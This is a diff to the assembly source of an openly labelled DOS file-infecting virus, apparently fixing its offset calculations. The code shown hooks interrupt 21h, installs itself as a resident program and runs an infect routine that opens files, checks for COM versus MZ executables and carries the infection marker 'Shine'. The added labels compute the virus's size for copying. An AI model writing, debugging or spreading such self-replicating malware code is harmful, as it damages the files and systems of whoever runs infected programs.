@@ -5,8 +5,9 @@
 
 org 0h
 
+beninging:
 
-call short $+3  ; To calculate delta offset
+call near start  ; To calculate delta offset
 start:
      pop bp           ; BP = Delta+3
      sub bp, 3        ; To get to the True start of the virus
@@ -22,8 +23,11 @@ install:
      int 21h          ; call int 21h
      mov word [goto_int21+bp+1], bx  ; Save Int 21h offset
      mov word [goto_int21+bp+3], es  ; And segment
+     push bp
+     add bp, new_int21
      mov ax, 2521h         ; Set vector 21h
-     mov dx, new_int21+bp  ; DS:DX = new_int21
+     mov dx, bp            ; DS:DX = BP = BP+new_int21
+     pop bp
      int 21h
      mov ax, 3100h         ; Terminate and Stay resident
      int 21h
@@ -79,7 +83,10 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      push bx          ; BX = File Handle
      mov ax, 3f00h    ; Read file or device
      mov cx, 2        ; Read 2 bytes, this case from the start to check wheter it's a COM file or an MZ Executable
-     mov dx, data_section.MZ_BUF+bp  ; Pointer to the MZ buffer
+     push bp
+     add bp, data_section.MZ_BUF
+     mov dx, bp       ; Pointer to the MZ buffer
+     pop bp
      int 21h          ; Calling int 21h
      cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ file?
      je .abort_infection
@@ -102,3 +109,6 @@ data_section:
      .save_bp dw 0
      .file_infected db 'Shine'
      .MZ_BUF dw 0
+
+virus_size equ endinging-beninging
+endinging:
